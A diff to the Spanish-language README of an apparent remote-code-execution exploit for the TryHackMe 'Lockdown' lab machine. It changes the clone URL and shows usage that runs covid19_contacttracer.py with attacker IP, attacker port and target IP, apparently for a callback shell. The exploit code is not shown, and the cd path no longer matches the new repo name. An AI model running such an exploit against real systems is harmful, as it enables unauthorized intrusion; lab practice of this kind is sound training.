@@ -7,7 +7,7 @@ Este es un exploit que use y mejoré para la máquina Lockdown de TryHackMe, te 
 
 ## Instalación y uso
 ```bash 
-$ git clone https://github.com/sha-16/Covid19-Contact-Tracing-System-1.0.git
+$ git clone https://github.com/sha-16/Covid19-Contact-Tracing-System-1.0-RCE.git
 $ cd Covid19-Contact-Tracing-System-1.0/
 $ chmod +x covid19_contacttracer.py
 $ python3 covid19_contacttracer.py <attacker-ip> <attacker-port> <target-ip>
